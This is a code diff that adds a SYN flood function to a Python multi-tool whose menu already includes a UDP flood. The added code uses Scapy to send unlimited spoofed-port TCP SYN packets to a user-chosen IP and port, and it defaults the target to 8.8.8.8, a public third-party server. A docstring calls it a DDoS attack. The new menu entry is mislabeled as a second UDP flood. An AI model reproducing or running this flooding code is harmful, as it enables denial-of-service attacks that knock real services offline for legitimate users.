@@ -230,6 +230,56 @@ def udpflood():
                 th = threading.Thread(target=run2)
                 th.start()
 
+'''
+The "synflood" function is a function that creates a SYN flood attack. This is a form of DDoS attack 
+(Distributed Denial of Service) attack in which the attacker sends too many SYN requests to the target, 
+exceeding its capacity to handle valid connections and thus making it inaccessible to legitimate users.
+
+The "sendPackages" function is an internal function that sends TCP SYN packets to the specified target with 
+the specified IP address and port. The "count" argument specifies the number of packets to be sent.
+
+Before calling the "sendPackages" function, the "synflood" function asks the user 
+to enter the target (IP and port) and whether he wants to limit the number of packets sent. 
+If the user does not want to limit, the variable "have_limit" is set to "False" and the 
+sendPackages" function will be called in an infinite loop, sending 1000 packets each iteration. 
+If the user wants to limit, he will be asked for the number of packets to be sent and 
+the function "sendPackages" will be called only once with the specified number of packets.
+'''
+def synflood():
+    def sendPackages(target_ip, target_port, count):
+        p=IP(dst=target_ip)/TCP(flags="S",  sport=RandShort(),  dport=int(target_port))
+        send(p,  verbose=0, loop=1, count=count)
+
+    target_ip = input("Target IP: ") 
+    target_port = input("Target Port: ") 
+    have_limit = input("Do you want to send unlimted pachakges (yes/no): ")
+    packages_count = 0
+
+    if(len(target_ip) == 0):
+        target_ip = "8.8.8.8"
+    if(len(target_port) == 0):
+        target_port = 80
+
+    if( have_limit != "yes" and have_limit != "y"):
+        have_limit = True
+        while(True):
+            packages_count = input("How many packages do you want to send (only int values permited)? ")
+            if(packages_count.isdigit()):
+                packages_count = int(packages_count)
+                break
+    else:
+        have_limit = False
+        
+    if(have_limit == True):
+        sendPackages(target_ip, target_port, packages_count)
+        print(str(packages_count) + " packages sended")
+    else:
+        counter = 0
+        while True:
+            counter += 1000
+            sendPackages(target_ip, target_port, counter)
+            print("1000 more packages sended\nTotal:" + str(counter))
+        
 
 '''
 The chat() function is responsible for implementing the client side of a messaging application. 
@@ -746,7 +796,8 @@ MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
 [3]->Secure messaging service.
 [4]->Analyze and process log files.
 [5]->UDP flood DOS atack.
-[6]->Exit.
+[6]->UDP flood DOS atack.
+[7]->Exit.
     '''
 
     print(banner)
@@ -772,6 +823,8 @@ MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
             elif answer == "5":
                 udpflood()
             elif answer == "6":
+                synflood()                       
+            elif answer == "7":
                 break
 
             else:
